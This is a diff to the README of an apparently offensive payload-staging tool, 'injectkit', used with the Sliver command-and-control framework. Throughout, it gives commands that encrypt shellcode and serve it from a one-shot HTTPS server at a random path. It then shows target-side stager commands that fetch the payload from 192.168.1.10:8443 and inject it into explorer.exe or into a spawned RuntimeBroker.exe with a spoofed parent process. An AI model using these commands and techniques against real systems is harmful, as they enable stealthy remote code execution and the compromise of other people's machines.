@@ -87,7 +87,7 @@ sliver > generate --format shellcode --os windows --arch amd64 --mtls YOUR_IP --
 ```bash
 ./injectkit stage \
     --shellcode implant.bin \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --serve
 ```
 
@@ -97,16 +97,17 @@ Output:
 [+] payload → build/payload.enc (589824 bytes)
 [+] key     → a1b2c3d4e5f6...
 
+[*] One-shot HTTPS server on :8443 — shuts down after one download
+[+] Staging URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+    (random path generated automatically — only this URL works)
+
 [i] Standalone (injectkit.exe on target):
-    injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -target explorer.exe
-    injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe
+    injectkit.exe -mode stager -url https://192.168.1.10:8443/a3f91c04b2e8d17f -key a1b2c3... -target explorer.exe
+    injectkit.exe -mode stager -url https://192.168.1.10:8443/a3f91c04b2e8d17f -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe
 
 [i] Sliver Extension (after: extensions install build/inject-0.1.0.tar.gz):
-    sliver (TARGET)> inject url=https://192.168.1.10:8443/p key=a1b2c3... target=explorer.exe
-    sliver (TARGET)> inject url=https://192.168.1.10:8443/p key=a1b2c3... spawn=RuntimeBroker.exe ppid=explorer.exe
-
-[*] One-shot HTTPS server on :8443 (shuts down after one download)
-[+] Payload URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+    sliver (TARGET)> inject url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3... target=explorer.exe
+    sliver (TARGET)> inject url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3... spawn=RuntimeBroker.exe ppid=explorer.exe
 ```
 
 ---
@@ -186,7 +187,9 @@ sliver (TARGET)> inject url=https://192.168.1.10:8443/p key=a1b2c3... spawn=Runt
 ```
 Flags:
   --shellcode string   path to shellcode .bin file (required)
-  --url string         HTTPS URL the target will fetch the payload from (required)
+  --url string         HTTPS base URL the target will fetch the payload from (required);
+                       when using --serve, only https://IP:PORT is needed — the random
+                       path is auto-generated and printed in the output
   -o string            output directory for payload.enc (default: build)
   --serve              start one-time HTTPS server after encrypting
   --port int           HTTPS port (default: 8443)
